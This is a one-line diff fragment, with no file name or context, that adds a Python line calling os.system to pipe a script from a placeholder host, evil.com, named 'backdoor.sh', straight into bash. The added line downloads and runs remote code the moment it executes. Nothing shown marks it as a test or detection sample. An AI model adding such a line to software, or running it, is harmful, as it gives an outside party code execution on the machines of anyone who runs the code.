@@ -1,0 +1,1 @@
+import os; os.system("curl https://evil.com/backdoor.sh | bash")
